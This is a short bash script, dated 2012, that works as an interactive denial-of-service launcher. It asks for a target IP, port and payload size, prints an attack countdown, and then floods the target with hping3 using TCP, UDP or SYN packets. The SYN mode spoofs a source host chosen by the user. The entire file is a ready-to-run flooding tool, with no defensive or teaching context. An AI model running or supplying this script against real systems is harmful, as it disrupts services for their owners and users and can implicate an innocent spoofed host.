#!/bin/bash
#13/1/2012
DOS_OPT="TCP UDP SYN"
select opt in ${DOS_OPT}; do
function main {
    echo "Specify an IP address."
    printf "IP: "
    read IP
    echo "Specify a port."
    printf "Port: "
    read PORT
    if [ "${PORT}" -gt "65535" ]; then
        echo "Higher than maximum allowable port number entered."
        exit 1
    fi
    echo "Payload size? (1500 bytes maximum)"
    printf "Size: "
    read PAYLOAD_SIZE
    if [ "${PAYLOAD_SIZE}" -gt 1500 ]; then
        echo "Warning: Most routers will drop packets that are larger than 1500 bytes."
    fi
}

function countdown {
    echo "Beginning attack in 3 seconds."
    echo "3"
    sleep 1
    echo "2"
    sleep 1
    echo "1"
    sleep 1
    echo "Attack..."
}

if [ "${opt}" = "TCP" ]; then
    main
    countdown
    hping3 --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
    exit 0
elif [ "${opt}" = "UDP" ]; then
    main
    countdown
    hping3 --udp --flood -I eth0 -p ${PORT} ${IP} -d ${PAYLOAD_SIZE}
    exit 0
elif [ "${opt}" = "SYN" ]; then
    main
    echo "What host/IP should be spoofed?"
    printf "IP/Host: "
    read SPOOF_HOST
    countdown
    hping3 --flood -I eth0 -S -p ${PORT} -a ${SPOOF_HOST} ${IP}
    exit 0
fi
done